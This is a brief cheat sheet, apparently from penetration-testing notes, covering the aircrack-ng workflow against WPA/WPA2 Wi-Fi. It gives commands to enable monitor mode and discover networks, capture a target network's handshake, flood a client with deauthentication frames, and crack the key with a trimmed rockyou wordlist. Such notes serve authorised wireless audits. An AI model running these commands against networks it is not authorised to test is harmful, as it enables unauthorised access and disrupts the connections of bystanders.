
### WiFi Security
Check Wireless interface
```
$ iwconfig wlan0
$ airmon-ng check / check kill (check and kill interfering processes with monitor interface)
```
Set up monitor mode interface on wlan0
```
$ airmon-ng start wlan0
or
$ airmon-ng stop wlan0mon
```
Check packet injection and link quality
```
$ aireplay-ng -9 wlan0mon
```
Discover wireless networks
```
$ kismet -c mon0
or
$ airodump-ng mon0
$ airodump-ng -c 11 -a mon0 (+lock to channel)
```
WPA Capture
```
Airodump-ng --bssid <TargetNetworkBSSID> -c <channel> -w handshake (outputfile)  wlan0mon (interface)
``` 
Deauth client from BSSID network
```
Aireplay-ng -0 0 -a <TargetNetworkBSSID> -c ClientMAC wlan0mon
```
Dictionary Attack vs WPA handshake - WPA keys are between 8 and 63 characters
Optimize wordlist for WPA/WPA2 testing
```
$ pw-inspector -i rockyou.txt -o optimized.txt -m 8 -M 63
then
$ aircrack-ng -w optimized.txt ../handshake/handshake.cap
```
